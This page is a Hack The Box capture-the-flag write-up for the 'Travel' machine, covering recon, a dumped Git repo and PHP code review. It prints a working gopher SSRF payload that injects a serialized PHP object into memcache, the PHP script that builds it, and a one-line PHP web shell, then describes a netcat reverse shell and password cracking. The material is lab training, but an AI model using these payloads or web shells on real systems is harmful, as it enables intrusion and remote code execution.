<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Travel - Hack The Box - hackcommander.io</title>
<meta name="description" content="Travel is an awesome box from my ATeam teammates xct and jkr. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Travel - Hack The Box">
<meta property="og:url" content="http://localhost:4000/htb-writeup-travel/">


  <meta property="og:description" content="Travel is an awesome box from my ATeam teammates xct and jkr. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-travel/travel_logo.png">





  <meta property="article:published_time" content="2020-09-05T00:00:00+02:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-writeup-travel/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Travel - Hack The Box</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Travel - Hack The Box">
    <meta itemprop="description" content="Travel is an awesome box from my ATeam teammates xct and jkr. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.">
    <meta itemprop="datePublished" content="September 05, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Travel - Hack The Box
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-09-05T00:00:00+02:00">September 05, 2020 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-writeup-travel/travel_logo.png" alt="" /></p>

<p>Travel is an awesome box from my ATeam teammates <a href="https://twitter.com/xct_de">xct</a> and <a href="https://twitter.com/ATeamJKR">jkr</a>. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.</p>

<h2 id="portscan">Portscan</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/travel$ sudo nmap -sC -sV -p- 10.10.10.189
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 20:14 EDT
Nmap scan report for travel.htb (10.10.10.189)
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB
443/tcp open  ssl/http nginx 1.17.6
|_http-server-header: nginx/1.17.6
|_http-title: Travel.HTB - SSL coming soon.
| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK
| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
| Not valid before: 2020-04-23T19:24:29
|_Not valid after:  2030-04-21T19:24:29
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.95 seconds
</code></pre></div></div>

<p>We can see 3 vhosts in the TLS certificate:</p>

<ul>
  <li>www.travel.htb</li>
  <li>blog.travel.htb</li>
  <li>blog-dev.travel.htb</li>
</ul>

<h2 id="1st-website---wwwtravelhtb">1st website - www.travel.htb</h2>

<p>There’s nothing interesting on the main web page: it’s just a static webpage with a non-functional susbcription form at the bottom. The other vhosts we found when running the nmap scan are probably where we want to go look next.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519201954045.png" alt="image-20200519201954045" /></p>

<h2 id="2nd-website---blogtravelhtb">2nd website - blog.travel.htb</h2>

<p>The blog page runs a Wordpress instance and the main page contains a hint about a new RSS feature being released soon from the dev team. This is probably what we will want to look at next.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519202315537.png" alt="image-20200519202315537" /></p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519202412080.png" alt="image-20200519202412080" /></p>

<p>We can run wpscan to check for low hanging fruits like configuration backups and so on but we don’t find anything interesting.  There’s only a single administrator account and because this is a Hard box, there isn’t any brute-forcing involved.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519202607209.png" alt="image-20200519202607209" /></p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519202717337.png" alt="image-20200519202717337" /></p>

<h2 id="3nd-website---blog-devtravelhtb">3nd website - blog-dev.travel.htb</h2>

<p>We don’t have access to the blog-dev page because there’s probably an .htaccess config file in there to prevent directory indexing.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519202202984.png" alt="image-20200519202202984" /></p>

<p>Just because directory indexing is disabled doesn’t mean we can’t look for other stuff that may be hidden. We’ll use ffuf to fuzz files and directories and we find a Git repository.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/travel$ ffuf -t 50 -w $WLRC -u http://blog-dev.travel.htb/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://blog-dev.travel.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
</code></pre></div></div>

<h2 id="dumping-the-git-repo-files">Dumping the Git repo files</h2>

<p>Using <a href="https://github.com/arthaud/git-dumper">git-dumper</a>, we can can download the entire Git repository:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/travel/tmp$ ~/tools/git-dumper/git-dumper.py http://blog-dev.travel.htb .
[-] Testing http://blog-dev.travel.htb/.git/HEAD [200]
[-] Testing http://blog-dev.travel.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://blog-dev.travel.htb/.gitignore [404]
[-] Fetching http://blog-dev.travel.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://blog-dev.travel.htb/.git/description [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-commit.sample [404]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://blog-dev.travel.htb/.git/hooks/post-receive.sample [404]
</code></pre></div></div>

<h2 id="first-glance-at-the-php-source-code">First glance at the PHP source code</h2>

<p>There’s only one commit in the repo so we won’t have to look for leftover credentials that were removed by a second commit or anything like that.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519203730705.png" alt="image-20200519203730705" /></p>

<p>The repo contains three files:</p>

<ul>
  <li>rss_template.php</li>
  <li>template.php</li>
  <li>README.md</li>
</ul>

<p>We’ll start by reading the instructions in the readme file to understand what this repo contains:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

## Setup

* `git clone https://github.com/WordPress/WordPress.git`
* copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty`
* create logs directory in `wp-content/themes/twentytwenty`
* create page in backend and choose rss_template.php as theme

## Changelog

- temporarily disabled cache compression
- added additional security checks
- added caching
- added rss template
</code></pre></div></div>

<p>The readme tells us there’s a custom RSS feed PHP application in <code class="language-plaintext highlighter-rouge">wp-content/themes/twentytwenty</code> along with the log directory location. It also mentions that caching has been added. This is interesting because this could mean we have to interact with redis or memcache later.</p>

<p><strong>rss_template</strong> is the main PHP code and contains a couple of interesting parts:</p>

<ol>
  <li>It’s using memcache to store the generated content for up to 60 seconds and it uses _xct as the prefix for the key.
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$data</span> <span class="o">=</span> <span class="nf">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$simplepie</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimplePie</span><span class="p">();</span>
      <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_cache_location</span><span class="p">(</span><span class="s1">'memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_'</span><span class="p">);</span>
      <span class="c1">//$simplepie-&gt;set_raw_data($data);</span>
      <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">set_feed_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
      <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
      <span class="nv">$simplepie</span><span class="o">-&gt;</span><span class="nf">handle_content_type</span><span class="p">();</span>
</code></pre></div>    </div>
  </li>
  <li>The URL of the custom feed is passed through the <strong>custom_feed_url</strong> parameter.
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'QUERY_STRING'</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="s2">"custom_feed_url"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">){</span>
<span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">"="</span><span class="p">,</span> <span class="nv">$url</span><span class="p">));</span> 	
<span class="nv">$url</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 	
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"http://www.travel.htb/newsfeed/customfeed.xml"</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>There’s a <strong>debug.php</strong> script that can be enabled by setting the debug parameter in the GET request
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
DEBUG
</span><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'debug'</span><span class="p">])){</span>
  <span class="k">include</span><span class="p">(</span><span class="s1">'debug.php'</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="c">
--&gt;</span>
</code></pre></div>    </div>
  </li>
</ol>

<p>The other file, <strong>template.php</strong> contains a function that filters the custom_feed_url parameter in an attempt to prevent SSRF’s and local file inclusion attacks. The filter is easily bypassed by using the 0 IP address value instead of 127.0.0.1 to reach localhost.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
<span class="p">{</span>
	<span class="c1">// this should be secure</span>
	<span class="nv">$tmpUrl</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"file://"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"@"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
	<span class="p">{</span>		
		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-o"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span> <span class="k">or</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$tmpUrl</span><span class="p">,</span> <span class="s2">"-F"</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span>
	<span class="p">{</span>		
		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
	<span class="c1">// preventing all localhost access</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
	<span class="p">{</span>		
		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>		
	<span class="p">}</span>
	<span class="k">return</span> <span class="nv">$url</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Next, there’s the actual function that is used by the custom RSS extension to retrieve the XML content of the feed. Note that it uses curl so there’s a big risk of command injection if  the parameters are not sufficiently sanitized.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">url_get_contents</span> <span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$url</span> <span class="o">=</span> <span class="nf">safe</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
	<span class="nv">$url</span> <span class="o">=</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
	<span class="nv">$pl</span> <span class="o">=</span> <span class="s2">"curl "</span><span class="mf">.</span><span class="nv">$url</span><span class="p">;</span>
	<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$pl</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Finally, there’s the <strong>TemplateHelper</strong> class that is used to log data into the <code class="language-plaintext highlighter-rouge">/logs</code>  sub-directory. This TemplateHelper isn’t used by the code at the moment but we could still use the <strong>init</strong> function called by the class constructor in a deserialization attack if we are able to pass a serialized object to the web application.</p>

<h2 id="using-the-ssrf-to-inject-into-memcache">Using the SSRF to inject into memcache</h2>

<p>When we click the Awesome RSS link at the top right we get the posts displayed from the <strong>customfeed.xml</strong> file hardcoded in the application since we didn’t specify any custom URL.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519211242784.png" alt="image-20200519211242784" /></p>

<p>When we specfiy the feed URL with <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/?debug=1&amp;custom_feed_url=http:/10.10.14.33/customfeed.xml</code> the XML from our server is retrieved and displayed.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519211549984.png" alt="image-20200519211549984" /></p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519211920530.png" alt="image-20200519211920530" /></p>

<p>In the source code, we see that there are HTML comments that are added, presumably by the <strong>debug.php</strong> file that we enabled by adding the <strong>debug</strong> parameter in the query. The output shows a PHP serialized object along with the key name. The output is cropped so we don’t see the full content of the key/value pair.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519212210864.png" alt="image-20200519212210864" /></p>

<p>It’s possible to smuggle requests to the memcache backend service through the custom_url_feed parameter that gets processed by the curl command. As we saw earlier, there’s some anti-SSRF filtering but it’s pretty weak and easily bypassed by using a 0 instead of localhost or 127.0.0.1. To send precise memcache commands to the server, we can use the Gopher protocol URI handler and the <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> utility that’ll encode our payload in the right format.</p>

<p>First we’ll do a test and create a simple key/value pair in the memcache instance. Gopherus automatically uses <strong>SpyD3r</strong> as the key name, something we’ll need to change later. Also, I’m not using a properly serialized payload for the first test, this is just to see if we’ll be able to write to memcache.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519212815234.png" alt="image-20200519212815234" /></p>

<p>We’ll test locally on a netcat listener to see if it sends the payload correctly. Here we see that it correctly sends the command to set the <strong>SpyD3r</strong> key and passed the CR and LF.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519213114194.png" alt="image-20200519213114194" /></p>

<p>We’re ready to test on the actual server, we’ll use the same payload and send it with Burp. We do need to change the 127.0.0.1 to 0 to avoid getting caught by the filter.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519213441178.png" alt="image-20200519213441178" /></p>

<p>Then when we check the content of the memcache through the <strong>debug.php</strong> script we can see that our content has successfully been been injected.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519213356601.png" alt="image-20200519213356601" /></p>

<h2 id="finding-the-correct-encoding-for-the-key-name">Finding the correct encoding for the key name</h2>

<p>Before we can move on to the PHP deserialization attack we have to find the correct key name that will be deserialized when we visit the RSS page with the <strong>custom_feed_url</strong> parameter. As we find during experimentation with Burp, the key name depends on the URI passed to the <strong>custom_feed_url</strong> parameter. The content of the XML file does not affect the key name which is generated.</p>

<p>For this next part we have to look at Wordpress’s source code and Simplepie’s source code to figure out how the key is constructed.</p>

<ul>
  <li>https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php</li>
  <li>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Memcache.php</li>
  <li>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Base.php</li>
</ul>

<p>The key name is constructed like this: <code class="language-plaintext highlighter-rouge">md5(md5($name)+":"+"spc")</code></p>

<p>We can test this theory by computing the name and checking to see if it matches the first part of the key which is visible from the memcache debug info.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519214505327.png" alt="image-20200519214505327" /></p>

<p>Good, so the key matches what we saw earlier. We’ll need to use <code class="language-plaintext highlighter-rouge">xct_0375e1e45d8573844bcfb43ffe0ca90a</code> instead of the default value provided by Gopherus after we do the next part: serializing a payload that’ll let us write a PHP command shell.</p>

<h2 id="php-deserialization-attack">PHP deserialization attack</h2>

<p>As we saw in the source code and from the memcache dump, the content of the XML file gets converted to a PHP object, serialized then stored into the memcache database if the cache entry doesn’t exist or has expired. When the next user visits the page to view the content, the values are pulled from the memcache and the object is deserialized. This is where we come in, we’ll use the <strong>TemplateHelper</strong> class to write a PHP command shell into the <strong>logs</strong> directory.</p>

<p>We copy the class to another PHP file and add a line that creates the object, passing the filename and content as parameters then echo the output so we can use with Gopherus.</p>

<p>Note: It is also important to change the $file and $data variables to private otherwise they won’t be included in the output.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">TemplateHelper</span>
<span class="p">{</span>

    <span class="k">private</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="n">init</span><span class="p">(</span><span class="kt">string</span> <span class="nv">$file</span><span class="p">,</span> <span class="kt">string</span> <span class="nv">$data</span><span class="p">)</span>
    <span class="p">{</span>        
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span><span class="mf">.</span><span class="s1">'/logs/'</span><span class="mf">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">###</span>
<span class="c1">### The part below has been added</span>
<span class="c1">###</span>
<span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplateHelper</span><span class="p">(</span><span class="s1">'snow.php'</span><span class="p">,</span> <span class="s1">'&lt;?php system($_REQUEST["c"]); ?&gt;'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>When running the script, we get the serialized output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snowscan@kali:~/htb/travel$ php exploit.php
PHP Warning:  file_put_contents(/home/snowscan/htb/travel/logs/snow.php): failed to open stream: No such file or directory in /home/snowscan/htb/travel/exploit.php on line 23
O:14:"TemplateHelper":2:{s:4:"file";s:8:"snow.php";s:4:"data";s:32:"&lt;?php system($_REQUEST["c"]); ?&gt;";}
</code></pre></div></div>

<h2 id="reverse-shell">Reverse shell</h2>

<p>So we’ll go back to Gopherus with the PHP payload and get the payload for the memcache injection.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519215655193.png" alt="image-20200519215655193" /></p>

<p>After changing the key for the correct value and replacing 127.0.0.1 by 0 we get the following payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gopher://0:11211/_%0d%0aset%20xct_0375e1e45d8573844bcfb43ffe0ca90a%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22snow.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22c%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
</code></pre></div></div>

<p>We’re ready to rock &amp; roll now, first we populate the memcache with the payload:</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519220457976.png" alt="image-20200519220457976" /></p>

<p>Then we go to <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/awesome-rss/?debug=1&amp;custom_feed_url=http://10.10.14.33/customfeed.xml</code> to trigger the deserialization.</p>

<p>And finally we test and see that our command shell has successfully been written. We have RCE.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519220622095.png" alt="image-20200519220622095" /></p>

<p>We’ll get a reverse shell with netcat.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519220905618.png" alt="image-20200519220905618" /></p>

<h2 id="enumeration">Enumeration</h2>

<p>We got a shell but we’re still running as www-data and haven’t found the user flag yet. After looking around the box we find a backup of the wordpress instance in the <strong>/opt</strong> directory.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519221106322.png" alt="image-20200519221106322" /></p>

<p>The database backup contains the hashed values for the users.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519221232400.png" alt="image-20200519221232400" /></p>

<p>The password for the <strong>lynik-admin</strong> user is cracked with john.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519221423280.png" alt="image-20200519221423280" /></p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519221457266.png" alt="image-20200519221457266" /></p>

<p>We can now log in with SSH to the box and get the user flag.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519221545913.png" alt="image-20200519221545913" /></p>

<h2 id="ldap-recon">LDAP recon</h2>

<p>The machine is running a container for the wordpress instance we saw earlier but there’s also another container running an LDAP server as indicated in the host file.</p>

<p><img src="/assets/images/htb-writeup-travel/image-20200519221749649.png" alt="image-20200519221749649" /></p>

<p>We can query the server with ldapsearch but we don’t have credentials so it returns no objects.</p>

